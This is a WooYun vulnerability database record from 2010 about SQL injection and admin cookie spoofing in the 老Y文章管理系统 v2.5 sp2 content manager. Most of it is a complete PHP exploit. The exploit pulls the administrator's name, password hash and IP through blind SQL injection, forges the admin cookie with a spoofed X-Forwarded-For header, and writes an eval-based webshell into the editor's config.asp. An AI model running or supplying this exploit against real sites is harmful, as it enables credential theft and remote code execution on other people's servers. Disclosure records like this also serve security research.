{"id": 24139, "wybug_id": "wooyun-2010-0585", "wybug_title": "老Y文章管理系统 v2.5 sp2 SQL注射&amp;Cookies欺骗漏洞", "wybug_corp": "老Y文章管理系统", "wybug_author": "路人甲", "wybug_date": "2010-09-22 00:12", "wybug_open_date": "2010-09-22 00:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["老", "注射利用技巧", "认证绕过", "欺骗登陆"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2010-09-22：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2010-09-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 老Y文章管理系统 v2.5 sp2的/user/UserLogin.asp文件存在一个SQL注射漏洞，导致恶意用户可以通过漏洞得到数据库的任何数据。另外后台登陆处理不当，导致通过伪造管理账号密码以及管理员IP即可欺骗登陆后台。 详细说明：     漏洞证明：  漏洞测试exp:<?phpini_set(\"max_execution_time\",0);error_reporting(7);function usage(){\tglobal $argv;\texit(\t\t\"\\n--+++============================================================+++--\".        \"\\n--+++==== \".base64_decode(\"wM9ZzsTVwrncwO3Ptc2zdjIuNXNwMiBCbGluZCBTUUwgSW5qZWN0aW9uIEV4cGxvaXQ=\").\" ====+++--\".        \"\\n--+++============================================================+++--\".\t\t\"\\n\\n[+] Author   : My5t3ry\".\t\t\"\\n[+] Team     : http://www.t00ls.net\".\t\t\"\\n[+] Blog     : http://www.bksec.net\".\t\t\"\\n[+] Usage    : php \".$argv[0].\" <hostname> <path>\".\t\t\"\\n[+] Ex.      : php \".$argv[0].\" localhost /\".\t\t\"\\n\\n\");}function query($pos, $chr, $chs){\tswitch ($chs){\t\tcase 1:\t        $query = \"admin' or 1=1 and (select asc(mid(Admin_Name,{$pos},1)) from [Yao_Admin] where id=1)={$chr} and '1'='1\";\t\tbreak;\t\tcase 2:\t\t\t$query = \"admin' or 1=1 and (select asc(mid(Admin_Pass,{$pos},1)) from [Yao_Admin] where id=1)={$chr} and '1'='1\";\t\tbreak;\t\tcase 3:\t\t\t$query = \"admin' or 1=1 and (select len(Admin_Name) from [Yao_Admin] where id=1)={$pos} and '1'='1\";\t\tbreak;\t\tcase 4:\t\t\t$query = \"admin' or 1=1 and (select asc(mid(Admin_IP,{$pos},1)) from [Yao_Admin] where id=1)={$chr} and '1'='1\";\t\tbreak;\t\tcase 5:\t\t\t$query = \"admin' or 1=1 and (select len(Admin_IP) from [Yao_Admin] where id=1)={$pos} and '1'='1\";\t\tbreak;\t}\t$query = urlencode($query);\treturn $query;}function exploit($hostname, $path, $pos, $chr, $chs){\t$chr = ord($chr);\t$conn = fsockopen($hostname, 80);\tif (!$conn){\t\texit(\"\\r\\n[-] No response from $conn\");\t}\t$postdata = \"Username=\".query($pos, $chr, $chs).\"&PassWord=aaaaaa&Submit=%B5%C7%C2%BC\";\t$message = \"POST \".$path.\"User/Userlogin.asp?action=login HTTP/1.1\\r\\n\";\t$message .= \"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\t$message .= \"Accept-Language: zh-cn\\r\\n\";\t$message .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\t$message .= \"Accept-Encoding: gzip, deflate\\r\\n\";\t$message .= \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\\r\\n\";\t$message .= \"Host: $hostname\\r\\n\";\t$message .= \"Content-Length: \".strlen($postdata).\"\\r\\n\";\t$message .= \"Cookie: ASPSESSIONIDSSCTBRDD=ILJJFNOABJJHHDMPDBAEJIGC\\r\\n\";\t$message .= \"Connection: Close\\r\\n\\r\\n\";\t$message .= $postdata;\tfputs($conn, $message);\twhile (!feof($conn))\t\t$reply .= fgets($conn, 1024);\tfclose($conn);\treturn $reply;}function crkusername($hostname, $path, $chs){\tglobal $length,$user;\t$key = \"abcdefghijklmnopqrstuvwxyz0123456789\";\t$chr = 0;\t$pos = 1;\techo \"[+] username: \";\twhile ($pos <= $length)\t{\t\t$response = exploit($hostname, $path, $pos, $key[$chr], $chs);\t\tpreg_match('/Set-Cookie:\\s([A-Za-z]{3})=ID=/',$response,$match);        if (strlen(trim($match[1])) != 0)\t\t{\t\t\t$user .= $key[$chr];\t\t\techo $key[$chr];\t\t\t$chr = 0;\t\t\t$pos++;\t\t}\t\telse\t\t\t$chr++;\t}\techo \"\\n\";}function crkpassword($hostname, $path, $chs){\tglobal $pass;\t$key = \"abcdef0123456789\";\t$chr = 0;\t$pos = 1;\techo \"[+] password: \";\twhile ($pos <= 18)\t{\t\t$response = exploit($hostname, $path, $pos, $key[$chr], $chs);\t\tpreg_match('/Set-Cookie:\\s([A-Za-z]{3})=ID=/',$response,$match);        if (strlen(trim($match[1])) != 0)\t\t{\t\t\t$pass .= $key[$chr];\t\t\techo $key[$chr];\t\t\t$chr = 0;\t\t\t$pos++;\t\t}\t\telse\t\t\t$chr++;\t}\techo \"\\n\";}function lengthcolumns($hostname, $path, $chs){\t$exit = 0;\t$length = 0;\t$pos = 1;\t$chr = 0;\twhile ($exit==0)\t{\t\t$response = exploit($hostname, $path, $pos, $chr, $chs);\t\tpreg_match('/Set-Cookie:\\s([A-Za-z]{3})=ID=/',$response,$match);\t\tif (strlen(trim($match[1])) != 0)\t\t{\t\t\t$exit = 1;\t\t\t$length = $pos;\t\t}\t\telse\t\t\t$pos++;\t\t    if($pos==20)\t\t\t\texit(\"\\r\\n[+] Exploit Failed.\\r\\n\");\t}\treturn $length;}function crkadminip($hostname, $path, $chs){\tglobal $iplength,$adminip;\t$key = \"1234567890.\";\t$chr = 0;\t$pos = 1;\techo \"[+] adminip: \";\twhile ($pos <= $iplength)\t{\t\t$response = exploit($hostname, $path, $pos, $key[$chr], $chs);\t\tpreg_match('/Set-Cookie:\\s([A-Za-z]{3})=ID=/',$response,$match);        if (strlen(trim($match[1])) != 0)\t\t{\t\t\t$adminip .= $key[$chr];\t\t\techo $key[$chr];\t\t\t$chr = 0;\t\t\t$pos++;\t\t}\t\telse\t\t\t$chr++;\t}\techo \"\\n\";}function getshell($hostname, $path, $user, $pass, $adminip){\t$conn = fsockopen($hostname, 80);\tif (!$conn){\t\texit(\"\\r\\n[-] No response from $conn\");\t}\t$postdata = \"d_name=user&d_initmode=EDIT&d_fixwidth=&d_skin=light1&d_width=500&d_height=300&d_stateflag=1&d_sbedit=1&d_sbview=1&d_detectfromword=1&d_autoremote=0&d_showborder=0&d_entermode=1&d_areacssmode=0&d_memo=500px%BF%ED%B6%C8%BD%E7%C3%E6%CF%C2%B5%C4%D7%EE%BC%F2%B9%A4%BE%DF%C0%B8%B0%B4%C5%A5%2C%CA%CA%BA%CF%D3%DA%D3%CA%BC%FE%CF%B5%CD%B3%C1%F4%D1%D4%CF%B5%CD%B3%B5%C8%D6%BB%D0%E8%D7%EE%BC%F2%B5%A5%B9%A6%C4%DC%B5%C4%D3%A6%D3%C3&d_uploadobject=0&d_autodir=2&d_allowbrowse=0&d_cusdirflag=0&d_baseurl=1&d_uploaddir=..%2Fuploadfiles%2F&d_basehref=&d_contentpath=&d_imageext=gif%7Cjpg%7Cjpeg%7Cbmp%7C%22%3Aeval%28request%28%22my%22%29%29%27&d_imagesize=0&d_flashext=swf&d_flashsize=0&d_mediaext=rm%7Cmp3%7Cwav%7Cmid%7Cmidi%7Cra%7Cavi%7Cmpg%7Cmpeg%7Casf%7Casx%7Cwma%7Cmov&d_mediasize=0&d_fileext=rar%7Czip%7Cpdf%7Cdoc%7Cxls%7Cppt%7Cchm%7Chlp&d_filesize=0&d_remoteext=gif%7Cjpg%7Cbmp&d_remotesize=0&d_localext=gif%7Cjpg%7Cbmp%7Cwmz%7Cpng&d_localsize=0&d_sltsyobject=0&d_sltsyext=jpg%7Cjpeg&d_sltflag=0&d_sltminsize=300&d_sltoksize=120&d_sywzflag=0&d_sywzminwidth=100&d_sywzminheight=100&d_sytext=%B0%E6%C8%A8%CB%F9%D3%D0...&d_syfontcolor=000000&d_syshadowcolor=FFFFFF&d_syshadowoffset=1&d_syfontsize=12&d_syfontname=%CB%CE%CC%E5&d_sywzposition=1&d_sywzpaddingh=5&d_sywzpaddingv=5&d_sywztextwidth=66&d_sywztextheight=17&d_sytpflag=0&d_sytpminwidth=100&d_sytpminheight=100&d_sytpposition=1&d_sytppaddingh=5&d_sytppaddingv=5&d_sypicpath=&d_sytpopacity=1&d_sytpimagewidth=88&d_sytpimageheight=31\";\t$message = \"POST \".$path.\"Admin/EditorAdmin/style.asp?action=StyleSetSave&id=2 HTTP/1.1\\r\\n\";\t$message .= \"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\t$message .= \"Accept-Language: zh-cn\\r\\n\";\t$message .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\t$message .= \"Accept-Encoding: gzip, deflate\\r\\n\";\t$message .= \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\\r\\n\";\t$message .= \"Host: $hostname\\r\\n\";\t$message .= \"X-FORWARDED-FOR: \".$adminip.\"\\r\\n\";\t$message .= \"Cookie: ASPSESSIONIDCADSSCQQ=OKLJGOECENDGHDLAKKIKBCAB; LaoYAdmin=UserName=\".$user.\"&UserPass=\".$pass.\"&UserID=1\\r\\n\";\t$message .= \"Content-Length: \".strlen($postdata).\"\\r\\n\";\t$message .= \"Connection: Close\\r\\n\\r\\n\";\t$message .= $postdata;\tfputs($conn, $message);\twhile (!feof($conn))\t\t$reply .= fgets($conn, 1024);\tfclose($conn);\treturn $reply;}if ($argc != 3)\tusage();$hostname = $argv[1];$path = $argv[2];echo \"[+] Len(username): \";$length = lengthcolumns($hostname, $path, 3);echo $length.\"\\n\";echo \"[+] Len(adminip): \";$iplength = lengthcolumns($hostname, $path, 5);echo $iplength.\"\\n\";crkusername($hostname, $path, 1);crkpassword($hostname, $path, 2);crkadminip($hostname, $path, 4);$reply = getshell($hostname, $path, $user, $pass, $adminip);if(eregi(chr(209).chr(249).chr(202).chr(189).chr(208).chr(222).chr(184).chr(196).chr(179).chr(201).chr(185).chr(166),$reply)){\techo \"[+] Exploit finished.\\r\\n\";\techo \"[+] shell:http://\".$hostname.\"/Editor/asp/config.asp?my=response.write(now())\\r\\n\";}else{\techo \"[-] Exploit failed.\\r\\n\";}?>   修复方案：  等待官方补丁   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：8 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 8, "Ranks": null}